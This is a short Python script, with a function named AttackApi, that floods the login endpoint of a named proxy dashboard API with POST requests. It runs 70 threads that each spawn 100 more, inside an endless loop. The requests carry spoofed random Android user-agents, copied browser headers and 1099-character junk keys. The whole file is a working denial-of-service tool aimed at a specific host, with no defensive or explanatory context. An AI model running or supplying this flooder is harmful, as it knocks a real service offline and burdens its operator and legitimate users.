import requests
import threading
import random
import string

def generate_random_string(length):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(length))

def AttackApi():
    url = "https://proxy.chams-mebarki-123.workers.dev/api/login"
    an_agent = f'Mozilla/5.0 (Linux; Android {random.randint(7,13)}; {"".join(random.choices(string.ascii_uppercase, k=3))}{random.randint(111,999)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'
    headers = {
        "content-length": "51",
        "sec-ch-ua-platform": "Android",
        "user-agent": an_agent,
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "accept": "*/*",
        "origin": "https://proxy-dashboard.pages.dev",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://proxy-dashboard.pages.dev/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-GB,en;q=0.9",
        "priority": "u=1, i"
    }

    data = {
        "account_id": random.randint(7,13),
        "dashboard_key": generate_random_string(1099)
    }

    response = requests.post(url, headers=headers, json=data)
    return response

def rangeLogin():
    threads = []
    for i in range(100):
        thread = threading.Thread(target=AttackApi)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def Range_Range():
    threads = []
    for i in range(70):
        thread = threading.Thread(target=rangeLogin)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

while True:
	Range_Range()
